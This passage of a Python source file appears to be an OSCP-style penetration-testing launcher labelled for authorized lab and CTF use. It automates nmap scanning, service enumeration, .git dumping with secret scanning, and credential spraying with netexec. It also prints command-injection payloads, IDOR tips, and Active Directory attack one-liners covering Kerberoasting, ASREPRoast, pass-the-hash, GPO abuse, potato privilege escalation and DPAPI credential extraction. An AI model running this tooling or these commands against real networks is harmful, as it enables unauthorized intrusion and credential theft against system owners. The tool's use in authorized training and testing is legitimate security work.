    print(f"    ;id  |id  `id`  $(id)  %3Bid  %7Cid  %60id%60")

    # IDOR hints (printed)
    print(f"\n  [TIP] IDOR checks — look for integer IDs in URLs/params:")
    print(f"    {url}/profile?id=1  →  try id=2,3,100...")
    print(f"    {url}/document?doc_id=1  →  iterate doc_id")


def follow_up_smb(ip: str, out_dir: Path, log_file: Optional[Path]) -> None:
    if have_bin("smbclient"):
        run_streaming_command(["smbclient", "-L", f"//{ip}", "-N"],
                              label=f"SMB smbclient {ip}",
                              combined_log=log_file, timeout_seconds=FOLLOW_UP_TIMEOUT)
    if have_bin("enum4linux"):
        run_streaming_command(["enum4linux", "-a", ip],
                              label=f"SMB enum4linux {ip}",
                              combined_log=log_file, timeout_seconds=FOLLOW_UP_TIMEOUT)
    cme = "netexec" if have_bin("netexec") else ("crackmapexec" if have_bin("crackmapexec") else None)
    if cme:
        run_streaming_command([cme, "smb", ip],
                              label=f"SMB {cme} {ip}",
                              combined_log=log_file, timeout_seconds=FOLLOW_UP_TIMEOUT)
        run_streaming_command([cme, "smb", ip, "-u", "guest", "-p", ""],
                              label=f"SMB {cme} guest {ip}",
                              combined_log=log_file, timeout_seconds=60)


def follow_up_snmp(ip: str, out_dir: Path, log_file: Optional[Path]) -> None:
    if have_bin("snmpwalk"):
        for community in ["public", "private", "manager"]:
            run_streaming_command(
                ["snmpwalk", "-v2c", "-c", community, ip],
                label=f"SNMP walk {ip} community={community}",
                combined_log=log_file, timeout_seconds=FOLLOW_UP_TIMEOUT)


def follow_up_ftp(ip: str, port: str, out_dir: Path, log_file: Optional[Path]) -> None:
    run_streaming_command(
        ["nmap", "-sV", "-p", port, "--script", "ftp-anon,ftp-syst,ftp-bounce", ip],
        label=f"FTP NSE {ip}:{port}", combined_log=log_file,
        timeout_seconds=FOLLOW_UP_TIMEOUT)


def follow_up_ldap(ip: str, log_file: Optional[Path]) -> None:
    run_streaming_command(
        ["nmap", "-p", "389,636,3268", "-sV", "--script", "ldap* and not brute", ip],
        label=f"LDAP follow-up {ip}", combined_log=log_file,
        timeout_seconds=FOLLOW_UP_TIMEOUT)


def follow_up_redis(ip: str, log_file: Optional[Path]) -> None:
    if have_bin("redis-cli"):
        for redis_cmd in [
            ["redis-cli", "-h", ip, "PING"],
            ["redis-cli", "-h", ip, "INFO"],
            ["redis-cli", "-h", ip, "CONFIG", "GET", "dir"],
            ["redis-cli", "-h", ip, "CONFIG", "GET", "dbfilename"],
            ["redis-cli", "-h", ip, "KEYS", "*"],
        ]:
            run_streaming_command(redis_cmd, label=f"Redis {redis_cmd[-1]} {ip}",
                                  combined_log=log_file, timeout_seconds=60)


def follow_up_smtp(ip: str, port: str, log_file: Optional[Path]) -> None:
    run_streaming_command(
        ["nmap", "-p", port, "--script",
         "smtp-commands,smtp-enum-users,smtp-open-relay,smtp-strangeport", ip],
        label=f"SMTP NSE {ip}:{port}", combined_log=log_file,
        timeout_seconds=FOLLOW_UP_TIMEOUT)
    if have_bin("smtp-user-enum"):
        ulist = best_wordlist(USER_WORDLIST_PRIORITY)
        if ulist:
            for method in ["VRFY", "EXPN", "RCPT"]:
                run_streaming_command(
                    ["smtp-user-enum", "-M", method, "-U", ulist, "-t", ip, "-p", port],
                    label=f"SMTP user-enum {method} {ip}:{port}",
                    combined_log=log_file, timeout_seconds=FOLLOW_UP_TIMEOUT)


def follow_up_dns(ip: str, log_file: Optional[Path]) -> None:
    run_streaming_command(
        ["nmap", "-p", "53", "--script",
         "dns-zone-transfer,dns-recursion,dns-service-discovery,dns-nsid", ip],
        label=f"DNS NSE {ip}", combined_log=log_file, timeout_seconds=120)
    if have_bin("dnsrecon"):
        run_streaming_command(["dnsrecon", "-t", "axfr", "-d", ip],
                              label=f"DNS dnsrecon axfr {ip}",
                              combined_log=log_file, timeout_seconds=120)
        run_streaming_command(["dnsrecon", "-t", "std", "-d", ip],
                              label=f"DNS dnsrecon std {ip}",
                              combined_log=log_file, timeout_seconds=120)
    if have_bin("dig"):
        run_streaming_command(["dig", "axfr", f"@{ip}"],
                              label=f"DNS dig axfr {ip}",
                              combined_log=log_file, timeout_seconds=60)


def follow_up_nfs(ip: str, out_dir: Path, log_file: Optional[Path]) -> None:
    run_streaming_command(["showmount", "-e", ip],
                          label=f"NFS showmount {ip}",
                          combined_log=log_file, timeout_seconds=60)
    run_streaming_command(
        ["nmap", "-p", "111,2049", "--script",
         "nfs-ls,nfs-showmount,nfs-statfs,rpcinfo", ip],
        label=f"NFS NSE {ip}", combined_log=log_file, timeout_seconds=120)


def follow_up_mysql(ip: str, port: str, log_file: Optional[Path]) -> None:
    run_streaming_command(
        ["nmap", "-p", port, "--script",
         "mysql-info,mysql-empty-password,mysql-databases,mysql-users,mysql-variables", ip],
        label=f"MySQL NSE {ip}:{port}", combined_log=log_file, timeout_seconds=120)


def follow_up_mssql(ip: str, port: str, log_file: Optional[Path]) -> None:
    run_streaming_command(
        ["nmap", "-p", port, "--script",
         "ms-sql-info,ms-sql-empty-password,ms-sql-config,ms-sql-ntlm-info", ip],
        label=f"MSSQL NSE {ip}:{port}", combined_log=log_file, timeout_seconds=120)
    cme = "netexec" if have_bin("netexec") else ("crackmapexec" if have_bin("crackmapexec") else None)
    if cme:
        run_streaming_command([cme, "mssql", ip],
                              label=f"MSSQL {cme} {ip}",
                              combined_log=log_file, timeout_seconds=120)


def follow_up_winrm(ip: str, port: str, log_file: Optional[Path]) -> None:
    run_streaming_command(
        ["nmap", "-p", port, "--script", "http-auth-finder,http-title", ip],
        label=f"WinRM NSE {ip}:{port}", combined_log=log_file, timeout_seconds=60)
    cme = "netexec" if have_bin("netexec") else ("crackmapexec" if have_bin("crackmapexec") else None)
    if cme:
        run_streaming_command([cme, "winrm", ip],
                              label=f"WinRM {cme} {ip}",
                              combined_log=log_file, timeout_seconds=120)

# NEW: Vhost fuzzing
def follow_up_vhost(ip: str, port: str, hostname: str, workspace: Path,
                    log_file: Optional[Path]) -> None:
    if not have_bin("ffuf"):
        print(f"  [TIP] vhost fuzz manually: ffuf -u http://{ip}:{port}/ "
              f"-H 'Host: FUZZ.{hostname}' -w <wordlist> -ac")
        return
    wl = best_wordlist(VHOST_WORDLIST_PRIORITY)
    if not wl:
        print("  [!] No vhost wordlist found. Install seclists.")
        return
    scheme = "https" if port in {"443", "8443"} else "http"
    url    = f"{scheme}://{ip}:{port}" if port not in {"80", "443"} else f"{scheme}://{ip}"
    run_streaming_command(
        ["ffuf", "-u", url, "-H", f"Host: FUZZ.{hostname}",
         "-w", wl, "-mc", "all", "-ac", "-c", "-t", "50"],
        label=f"WEB vhost-fuzz {ip}:{port} → *.{hostname}",
        combined_log=log_file, timeout_seconds=FOLLOW_UP_TIMEOUT)
    print(f"\n  [TIP] Found vhosts → add to /etc/hosts:")
    print(f"    echo '{ip} <vhost>.{hostname}' >> /etc/hosts")

# NEW: .git exposure
def follow_up_git(ip: str, port: str, log_file: Optional[Path]) -> None:
    scheme = "https" if port in {"443", "8443"} else "http"
    url    = f"{scheme}://{ip}:{port}" if port not in {"80", "443"} else f"{scheme}://{ip}"
    # Probe for .git/HEAD
    if have_bin("curl"):
        run_streaming_command(
            ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}",
             f"{url}/.git/HEAD"],
            label=f"WEB .git probe {ip}:{port}", combined_log=log_file, timeout_seconds=20)
    if have_bin("git-dumper"):
        run_streaming_command(
            ["git-dumper", f"{url}/.git", f"/tmp/gitdump_{ip}_{port}"],
            label=f"WEB git-dumper {ip}:{port}", combined_log=log_file,
            timeout_seconds=FOLLOW_UP_TIMEOUT)
        if have_bin("trufflehog"):
            run_streaming_command(
                ["trufflehog", "filesystem", f"/tmp/gitdump_{ip}_{port}"],
                label=f"WEB trufflehog {ip}:{port}", combined_log=log_file,
                timeout_seconds=120)
    else:
        print(f"  [TIP] git-dumper: pip3 install git-dumper")
        print(f"         git-dumper {url}/.git /tmp/gitdump_{ip}")
        print(f"         cd /tmp/gitdump_{ip} && git log --oneline && git diff HEAD~1")

# NEW: CeWL custom wordlist
def follow_up_cewl(ip: str, port: str, workspace: Path,
                   log_file: Optional[Path]) -> Optional[Path]:
    if not have_bin("cewl"):
        print("  [TIP] cewl: apt install cewl")
        return None
    scheme = "https" if port in {"443", "8443"} else "http"
    url    = f"{scheme}://{ip}:{port}"
    out    = workspace / f"cewl_{ip}_{port}.txt"
    run_streaming_command(
        ["cewl", url, "-d", "3", "-m", "5", "-w", str(out)],
        label=f"CeWL wordlist {url}", combined_log=log_file,
        timeout_seconds=FOLLOW_UP_TIMEOUT)
    if out.exists() and out.stat().st_size > 0:
        print(f"  [+] CeWL wordlist: {out}")
        return out
    return None

# NEW: exiftool on discovered files
def follow_up_exiftool(workspace: Path, log_file: Optional[Path]) -> None:
    if not have_bin("exiftool"):
        print("  [TIP] exiftool: apt install libimage-exiftool-perl")
        return
    targets = (list(workspace.rglob("*.pdf")) + list(workspace.rglob("*.docx"))
               + list(workspace.rglob("*.xlsx")) + list(workspace.rglob("*.jpg")))
    if not targets:
        print("  [+] No files found for exiftool analysis in workspace.")
        return
    for f in targets[:10]:
        run_streaming_command(
            ["exiftool", str(f)],
            label=f"exiftool {f.name}", combined_log=log_file, timeout_seconds=30)


def service_follow_up(parsed: Dict, workspace: Path, log_file: Optional[Path]) -> None:
    follow_dir = workspace / "follow_up"
    follow_dir.mkdir(exist_ok=True)
    seen: set = set()

    # Collect hostnames for vhost fuzzing
    all_hostnames: List[str] = []
    for host in parsed.get("hosts", []):
        all_hostnames.extend(host.get("hostnames", []))

    for host in parsed.get("hosts", []):
        ip = host["address"]
        for p in host["open_ports"]:
            svc  = (p["service"] or "").lower()
            port = p["port"]
            key  = (ip, port, svc)
            if key in seen:
                continue
            seen.add(key)

            is_http = ("http" in svc) or (
                port in {"80", "443", "8080", "8443", "9443"} and ("http" in svc or not svc))

            if is_http:
                follow_up_http(ip, port, svc, follow_dir, log_file)
                follow_up_git(ip, port, log_file)
                if all_hostnames:
                    for hn in all_hostnames[:2]:
                        follow_up_vhost(ip, port, hn, follow_dir, log_file)
                else:
                    default_hn = f"{ip}.htb"
                    if yes_no(f"  Try vhost fuzz against {default_hn}?", default=False):
                        follow_up_vhost(ip, port, default_hn, follow_dir, log_file)
            elif svc in {"microsoft-ds", "netbios-ssn"} or port == "445":
                follow_up_smb(ip, follow_dir, log_file)
            elif svc == "snmp" or port in {"161", "162"}:
                follow_up_snmp(ip, follow_dir, log_file)
            elif svc == "ftp" or port == "21":
                follow_up_ftp(ip, port, follow_dir, log_file)
            elif svc == "ldap" or port in {"389", "636", "3268", "3269"}:
                follow_up_ldap(ip, log_file)
            elif svc == "redis" or port == "6379":
                follow_up_redis(ip, log_file)
            elif svc in {"nfs", "mountd"} or port == "2049":
                follow_up_nfs(ip, follow_dir, log_file)
            elif svc == "smtp" or port in {"25", "465", "587"}:
                follow_up_smtp(ip, port, log_file)
            elif svc == "domain" or port == "53":
                follow_up_dns(ip, log_file)
            elif svc in {"ms-sql-s", "ms-sql", "mssql"} or port == "1433":
                follow_up_mssql(ip, port, log_file)
            elif svc == "mysql" or port == "3306":
                follow_up_mysql(ip, port, log_file)
            elif svc in {"wsman", "winrm"} or port in {"5985", "5986"}:
                follow_up_winrm(ip, port, log_file)


# ─────────────────────────────────────────────
# Credential spray
# ─────────────────────────────────────────────

def credential_spray(parsed: Dict, workspace: Path, log_file: Optional[Path]) -> None:
    if not CRED_STORE:
        print("[!] No credentials in session store.")
        return
    cme = "netexec" if have_bin("netexec") else ("crackmapexec" if have_bin("crackmapexec") else None)
    if not cme:
        print("[!] netexec/crackmapexec not found.")
        return
    spray_log  = workspace / "cred_spray.log"
    real_creds = [c for c in CRED_STORE if c.cred_type not in ("anonymous", "no-auth")]
    if not real_creds:
        print("[!] Only anonymous/no-auth credentials found.")
        return

    services_seen: Dict[str, List[str]] = {}
    for host in parsed.get("hosts", []):
        ip = host["address"]
        for p in host["open_ports"]:
            svc  = (p["service"] or "").lower()
            port = p["port"]
            if svc in {"microsoft-ds", "netbios-ssn"} or port == "445":
                services_seen.setdefault("smb", []).append(ip)
            if svc in {"wsman", "winrm"} or port in {"5985", "5986"}:
                services_seen.setdefault("winrm", []).append(ip)
            if svc == "ssh" or port == "22":
                services_seen.setdefault("ssh", []).append(ip)

    total = sum(len(v) for v in services_seen.values())
    print(f"\n[+] Spraying {len(real_creds)} credential(s) × {total} target(s). "
          f"Exact pairs only — no brute force.")
    for proto, ips in services_seen.items():
        for cred in real_creds:
            for ip in ips:
                run_streaming_command(
                    [cme, proto, ip,
                     "-u", cred.username, "-p", cred.secret, "--no-bruteforce"],
                    label=f"SPRAY {proto} {ip} {cred.username}",
                    combined_log=spray_log, timeout_seconds=30)


# ─────────────────────────────────────────────
# UDP sweep
# ─────────────────────────────────────────────

def run_udp_sweep(target: str, workspace: Path, stamp: str,
                  log_file: Optional[Path]) -> Optional[Path]:
    base = workspace / f"UDP_{sanitize_target(target)}_{stamp}"
    cmd  = ["nmap", "-sU", "-T4", "-p", UDP_CRITICAL_PORTS,
             "--open", "--stats-every", "15s", "-oA", str(base), target]
    print(f"\n[+] UDP sweep ports: {UDP_CRITICAL_PORTS}")
    run_or_resume_oA(cmd, base, "UDP Critical Port Sweep",
                     cwd=workspace, combined_log=log_file)
    xml = Path(str(base) + ".xml")
    return xml if xml.exists() else None


# ─────────────────────────────────────────────
# Two-phase scan
# ─────────────────────────────────────────────

def two_phase_scan(
    target: str, workspace: Path, stamp: str, log_file: Optional[Path],
    label_prefix: str = "IP", extra_flags: Optional[List[str]] = None,
) -> List[Path]:
    extra = extra_flags or []
    xmls: List[Path] = []

    base1 = workspace / f"{label_prefix}_{sanitize_target(target)}_{stamp}_phase1"
    cmd1  = [
        "nmap", "-sS", "-sV", "-T4", "--open",
        "--min-rate", "5000",
        "--script", f"{NSE_DEFAULT},{NSE_HTTP},{NSE_SMB},{NSE_SSH}",
        "--stats-every", "10s",
        "-oA", str(base1),
    ] + extra + [target]
    run_or_resume_oA(cmd1, base1, f"{label_prefix} Phase 1 — Top-1000 TCP + NSE",
                     cwd=workspace, combined_log=log_file)
    xml1 = Path(str(base1) + ".xml")
    if xml1.exists():
        xmls.append(xml1)

    base2   = workspace / f"{label_prefix}_{sanitize_target(target)}_{stamp}_phase2"
    parsed1 = parse_nmap_xml(xml1) if xml1.exists() else {"hosts": []}
    all_p1  = [p for h in parsed1["hosts"] for p in h["open_ports"]]
    nse_full = nse_for_ports(all_p1)
    cmd2 = [
        "nmap", "-sS", "-sV", "-Pn", "-T4", "-p-",
        "--min-rate", "5000",
        "--script", nse_full,
        "--stats-every", "10s",
        "-oA", str(base2),
    ] + extra + [target]
    print("\n[+] Phase 2 (full -p-) starting...")
    run_or_resume_oA(cmd2, base2, f"{label_prefix} Phase 2 — Full TCP -p-",
                     cwd=workspace, combined_log=log_file)
    xml2 = Path(str(base2) + ".xml")
    if xml2.exists():
        xmls.append(xml2)

    if yes_no("Run UDP sweep against critical ports?", default=True):
        udp_xml = run_udp_sweep(target, workspace, stamp, log_file)
        if udp_xml:
            xmls.append(udp_xml)

    return xmls


# ─────────────────────────────────────────────
# Handoff write
# ─────────────────────────────────────────────

def write_handoff(
    ranked: List[Dict], parsed: Dict,
    workspace: Path, target: str, stamp: str, scan_type: str,
) -> Path:
    hf = HandoffFile(
        workspace    = str(workspace),
        target       = target,
        stamp        = stamp,
        scan_type    = scan_type,
        ranked       = ranked,
        cred_store   = cred_store_as_dicts(),
        parsed_hosts = parsed.get("hosts", []),
    )
    path = save_handoff(hf, workspace)
    print(f"\n[+] Triage handoff written: {path}")
    print(f"    Load with: sudo python3 exploit_runner.py {workspace}")
    return path


# ─────────────────────────────────────────────
# Post-processing
# ─────────────────────────────────────────────

def post_process(
    xmls: List[Path], workspace: Path,
    title: str, target: str, stamp: str, scan_type: str,
    log_file: Optional[Path] = None,
    extra_notes: Optional[List[str]] = None,
) -> None:
    combined_xml  = workspace / f"{scan_type}_{sanitize_target(target)}_{stamp}_combined.xml"
    combined_html = workspace / f"{scan_type}_{sanitize_target(target)}_{stamp}_combined.html"
    combined_md   = workspace / f"{scan_type}_{sanitize_target(target)}_{stamp}_combined.md"

    if len(xmls) == 1:
        combined_xml = xmls[0]
    elif len(xmls) > 1:
        merge_nmap_xmls(xmls, combined_xml)

    build_html(combined_xml, combined_html, log_file=log_file)

    notes = [
        f"Workspace: `{workspace}`",
        f"HTML: `{combined_html.name if combined_html.exists() else 'not generated'}`",
    ] + (extra_notes or [])

    generate_markdown_summary(
        title=title, target=target, scan_type=scan_type,
        stamp=stamp, xml_files=[combined_xml],
        output_md=combined_md, notes=notes)

    parsed = parse_nmap_xml(combined_xml)
    generate_obsidian_host_notes(parsed, workspace / "obsidian_notes")

    ranked = score_parsed_against_playbook(parsed, PLAYBOOK)
    print_triage_list(ranked, output_md=combined_md)

    # Searchsploit all banners automatically
    if have_bin("searchsploit") and parsed.get("hosts"):
        if yes_no("Run searchsploit against all discovered banners?", default=True):
            searchsploit_banners(parsed, workspace, log_file)

    # Service follow-up
    if yes_no("Run automatic service-based follow-up enumeration?", default=False):
        service_follow_up(parsed, workspace, log_file)
        follow_up_exiftool(workspace, log_file)

    # CeWL wordlist generation
    http_ports = [(h["address"], p["port"])
                  for h in parsed.get("hosts", [])
                  for p in h["open_ports"]
                  if "http" in (p["service"] or "").lower()
                  or p["port"] in {"80", "443", "8080"}]
    if http_ports and yes_no("Build CeWL custom wordlist from web targets?", default=False):
        ip, port = http_ports[0]
        follow_up_cewl(ip, port, workspace, log_file)

    # Hash crack helper
    if yes_no("Hash cracking helper?", default=False):
        hash_crack_helper(workspace, log_file)

    # Post-exploit helper
    all_ports = [p for h in parsed.get("hosts", []) for p in h["open_ports"]]
    high_conf  = [r for r in ranked if r["score"] >= 8]
    if high_conf:
        os_guess = guess_os_from_services(all_ports)
        print(f"\n[+] High-confidence findings detected. OS guess: {os_guess}")
        if yes_no("Show post-exploit one-liner helper?", default=True):
            post_exploit_helper(target, os_guess)

    # Privesc script server
    if yes_no("Serve linpeas/winpeas via HTTP for download?", default=False):
        serve_privesc_scripts(workspace, log_file)

    # Credential spray
    if CRED_STORE:
        print_cred_store()
        if yes_no("Spray accumulated credentials across discovered services?", default=False):
            credential_spray(parsed, workspace, log_file)

    # Write handoff for exploit_runner
    write_handoff(ranked, parsed, workspace, target, stamp, scan_type)

    print(f"\n[+] Workspace: {workspace}")
    print(f"[+] Next step: sudo python3 exploit_runner.py {workspace}")


# ─────────────────────────────────────────────
# Scan actions
# ─────────────────────────────────────────────

def fast_subnet_scan() -> None:
    target    = prompt_until_valid("Enter subnet (X.X.X.0/24): ", validate_network)
    stamp     = now_stamp()
    workspace = make_workspace("Fast", target, stamp)
    log_file  = workspace / "run.log"
    base      = workspace / f"Fast_{sanitize_target(target)}_{stamp}"
    cmd = [
        "nmap", "-sS", "-sV", "-T4", "-F", "--open",
        "--min-rate", "5000",
        "--script", f"{NSE_DEFAULT},{NSE_HTTP},{NSE_SMB}",
        "--stats-every", "10s",
        "-oA", str(base), target,
    ]
    run_or_resume_oA(cmd, base, "Fast Subnet Scan", cwd=workspace, combined_log=log_file)
    udp_xmls: List[Path] = []
    if yes_no("Run UDP sweep?", default=False):
        udp_xml = run_udp_sweep(target, workspace, stamp, log_file)
        if udp_xml:
            udp_xmls.append(udp_xml)
    post_process(
        xmls=[Path(str(base) + ".xml")] + udp_xmls,
        workspace=workspace, title="Fast Subnet Scan Summary",
        target=target, stamp=stamp, scan_type="Fast", log_file=log_file)


def detailed_ip_scan() -> None:
    target    = prompt_until_valid("Enter IP (X.X.X.X): ", validate_ip)
    stamp     = now_stamp()
    workspace = make_workspace("IP", target, stamp)
    log_file  = workspace / "run.log"
    xmls      = two_phase_scan(target, workspace, stamp, log_file, label_prefix="IP")
    post_process(xmls=xmls, workspace=workspace, title="Detailed IP Scan Summary",
                 target=target, stamp=stamp, scan_type="IP", log_file=log_file)


def discover_live_hosts(network: str, workspace: Path, stamp: str,
                        log_file: Optional[Path]) -> List[str]:
    base = workspace / f"Discovery_{sanitize_target(network)}_{stamp}"
    cmd  = ["nmap", "-sn", "--min-rate", "5000", "--stats-every", "10s",
             "-oA", str(base), network]
    run_or_resume_oA(cmd, base, "Host Discovery", cwd=workspace, combined_log=log_file)
    parsed = parse_nmap_xml(Path(str(base) + ".xml"))
    return [h["address"] for h in parsed["hosts"] if h["address"] != "unknown"]


def host_full_scan(ip: str, workspace: Path, stamp: str) -> Tuple[str, List[Path]]:
    log_file = workspace / "run.log"
    xmls = two_phase_scan(ip, workspace, stamp, log_file, label_prefix="Host",
                           extra_flags=["-Pn"])
    return ip, xmls


def detailed_subnet_scan() -> None:
    target    = prompt_until_valid("Enter subnet (X.X.X.0/24): ", validate_network)
    stamp     = now_stamp()
    workspace = make_workspace("Full", target, stamp)
    log_file  = workspace / "run.log"

    if not yes_no("Use parallel host-based mode?", default=True):
        xmls = two_phase_scan(target, workspace, stamp, log_file, label_prefix="Full")
        post_process(xmls=xmls, workspace=workspace, title="Detailed Subnet Scan Summary",
                     target=target, stamp=stamp, scan_type="Full", log_file=log_file)
        return

    live_hosts = discover_live_hosts(target, workspace, stamp, log_file)
    if not live_hosts:
        print("[!] No live hosts found.")
        return

    try:
        workers = max(1, int(input("Parallel worker count [4]: ").strip() or "4"))
    except ValueError:
        workers = 4

    all_xmls: List[Path] = []
    total = len(live_hosts)
    print(f"[+] Parallel scan: {total} hosts, {workers} workers.")
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures   = {ex.submit(host_full_scan, ip, workspace, stamp): ip for ip in live_hosts}
        completed = 0
        for future in as_completed(futures):
            ip = futures[future]
            try:
                _, xml_paths = future.result()
                completed += 1
                print(f"[+] Completed {completed}/{total}: {ip}")
                all_xmls.extend(xml_paths)
            except Exception as e:
                completed += 1
                print(f"[!] Error on {ip}: {e}")

    post_process(
        xmls=all_xmls, workspace=workspace,
        title="Detailed Subnet Parallel Scan Summary",
        target=target, stamp=stamp, scan_type="Full", log_file=log_file,
        extra_notes=[f"Live hosts: `{len(live_hosts)}`", f"Workers: `{workers}`"])


def ad_scan() -> None:
    target    = prompt_until_valid("Enter AD target IP (X.X.X.X): ", validate_ip)
    stamp     = now_stamp()
    workspace = make_workspace("AD", target, stamp)
    log_file  = workspace / "run.log"
    base      = f"AD_{sanitize_target(target)}_{stamp}"

    steps = [
        ("Step 1/5 - AD Services", [
            "nmap", "-sS", "-sV", "-Pn", "-T4",
            "-p", "53,88,135,389,445,464,636,3268,3269,5985,5986",
            "--min-rate", "5000",
            "--script", f"{NSE_DEFAULT},{NSE_SMB}",
            "--stats-every", "10s",
            "-oA", str(workspace / f"{base}_services"), target]),
        ("Step 2/5 - LDAP", [
            "nmap", "-p", "389,636,3268,3269", "-sV",
            "--script", "ldap* and not brute",
            "--stats-every", "10s",
            "-oA", str(workspace / f"{base}_ldap"), target]),
        ("Step 3/5 - SMB Info + Signing", [
            "nmap", "-p", "445",
            "--script", "smb-security-mode,smb2-security-mode,smb-os-discovery",
            "--stats-every", "10s",
            "-oA", str(workspace / f"{base}_smb"), target]),
        ("Step 4/5 - SMB Enum", [
            "nmap", "-p", "445",
            "--script", "smb-enum-shares,smb-enum-users,smb-enum-groups",
            "--stats-every", "10s",
            "-oA", str(workspace / f"{base}_smb_enum"), target]),
        ("Step 5/5 - Kerberos", [
            "nmap", "-p", "88", "--script", "krb5-enum-users",
            "--stats-every", "10s",
            "-oA", str(workspace / f"{base}_kerb"), target]),
    ]

    xmls: List[Path] = []
    for label, cmd in steps:
        out_base = Path(cmd[cmd.index("-oA") + 1])
        run_or_resume_oA(cmd, out_base, label, cwd=workspace, combined_log=log_file)
        xml = Path(str(out_base) + ".xml")
        if xml.exists():
            xmls.append(xml)

    if yes_no("Run UDP sweep?", default=True):
        udp_xml = run_udp_sweep(target, workspace, stamp, log_file)
        if udp_xml:
            xmls.append(udp_xml)

    cme = "netexec" if have_bin("netexec") else ("crackmapexec" if have_bin("crackmapexec") else None)
    if cme:
        run_streaming_command([cme, "smb", target, "--shares", "-u", "", "-p", ""],
                              label="AD null-session shares", combined_log=log_file, timeout_seconds=60)
        run_streaming_command([cme, "smb", target, "--users", "-u", "", "-p", ""],
                              label="AD null-session users", combined_log=log_file, timeout_seconds=60)

    # AD-specific follow-up hints
    print("\n" + "═" * 60)
    print("  AD ATTACK SURFACE HINTS")
    print("═" * 60)
    print(f"\n  ASREPRoast (no pre-auth users):")
    print(f"    impacket-GetNPUsers domain.local/ -dc-ip {target} -request -format hashcat -outputfile asrep.txt")
    print(f"    hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt")
    print(f"\n  Kerberoast (SPN accounts):")
    print(f"    impacket-GetUserSPNs domain.local/user:pass -dc-ip {target} -request -outputfile kerb.txt")
    print(f"    hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt")
    print(f"\n  Pass-the-Hash:")
    print(f"    impacket-psexec domain/user@{target} -hashes lm:nt")
    print(f"    impacket-wmiexec domain/user@{target} -hashes lm:nt")
    print(f"    evil-winrm -i {target} -u user -H <NTHASH>")
    print(f"\n  ACL / ACE abuse (PowerView):")
    print(f"    Find-InterestingDomainAcl -ResolveGUIDs | ?{{$_.IdentityReferenceName -match 'user'}}")
    print(f"    bloodyAD --host {target} -d domain -u user -p pass get object <TARGET> --attr ntSecurityDescriptor")
    print(f"\n  Shadow credentials (ADCS):")
    print(f"    certipy find -u user@domain -p pass -dc-ip {target}")
    print(f"    pywhisker.py -d domain -u user -p pass --target target_user --action add")
    print(f"\n  GPO abuse:")
    print(f"    Get-GPO -All | Get-GPPermissions -TargetType User -TargetName user")
    print(f"    SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author 'NT AUTHORITY\\SYSTEM' --Command 'cmd.exe'")
    print(f"\n  Token abuse (SeImpersonatePrivilege):")
    print(f"    GodPotato-NET4.exe -cmd 'cmd.exe /c whoami'")
    print(f"    PrintSpoofer.exe -i -c powershell")
    print(f"    JuicyPotatoNG.exe -t * -p cmd.exe -a '/c whoami'")
    print(f"\n  DPAPI credential extraction:")
    print(f"    netexec smb {target} -u user -p pass --dpapi")
    print(f"    donpapi -d domain -u user -p pass {target}")
    print("═" * 60)

    post_process(
        xmls=xmls, workspace=workspace, title="AD Scan Summary",
        target=target, stamp=stamp, scan_type="AD", log_file=log_file,
        extra_notes=["Steps: services, LDAP, SMB info+signing, SMB enum, Kerberos"])


def custom_scan() -> None:
    target    = prompt_until_valid("Enter IP or subnet: ",
                                   lambda v: v if v else (_ for _ in ()).throw(ValueError("Required")))
    ports_raw = input("Enter ports (e.g. 8080,8443,9200 or 1-65535) [default top-1000]: ").strip()
    ports_arg = ports_raw if ports_raw else None
    stamp     = now_stamp()
    workspace = make_workspace("Custom", target, stamp)
    log_file  = workspace / "run.log"
    base      = workspace / f"Custom_{sanitize_target(target)}_{stamp}"

    extra_scripts = input("Additional NSE scripts (comma-sep, blank for none): ").strip()
    script_arg    = f"{NSE_DEFAULT},{NSE_HTTP},{NSE_SMB}"
    if extra_scripts:
        script_arg += f",{extra_scripts}"
    if Path("/usr/share/nmap/scripts/vulners.nse").exists():
        script_arg += f",{NSE_VULNERS}"

    cmd = [
        "nmap", "-sS", "-sV", "-Pn", "-T4", "--open",
        "--min-rate", "5000",
        "--script", script_arg,
        "--stats-every", "10s",
        "-oA", str(base),
    ]
    if ports_arg:
        cmd += ["-p", ports_arg]
    cmd.append(target)
    run_or_resume_oA(cmd, base, "Custom Scan", cwd=workspace, combined_log=log_file)
    post_process(
        xmls=[Path(str(base) + ".xml")],
        workspace=workspace, title="Custom Scan Summary",
        target=target, stamp=stamp, scan_type="Custom", log_file=log_file)


# ─────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────

def main() -> None:
    require_root()
    require_nmap()

    global PLAYBOOK
    PLAYBOOK = load_playbook()

    print_tool_banner()

    print("\n╔══════════════════════════════════════════════╗")
    print("║  OSCP Scan Launcher v6                       ║")
    print("║  Authorized lab / CTF use only               ║")
    print("╠══════════════════════════════════════════════╣")
    print("║  A) Fast Subnet Scan                         ║")
    print("║  B) Detailed IP Scan (two-phase + UDP)       ║")
    print("║  C) Detailed Subnet Scan (parallel)          ║")
    print("║  D) AD Scan (LDAP + SMB + Kerberos)          ║")
    print("║  E) Custom Port/Service Deep-Dive            ║")
    print("╚══════════════════════════════════════════════╝")

    choice = input("Choice [A/B/C/D/E]: ").strip().upper()
    dispatch = {
        "A": fast_subnet_scan,
        "B": detailed_ip_scan,
        "C": detailed_subnet_scan,
        "D": ad_scan,
        "E": custom_scan,
    }
    fn = dispatch.get(choice)
    if fn:
        fn()
    else:
        print("[!] Invalid option.")
        sys.exit(1)


if __name__ == "__main__":
    main()
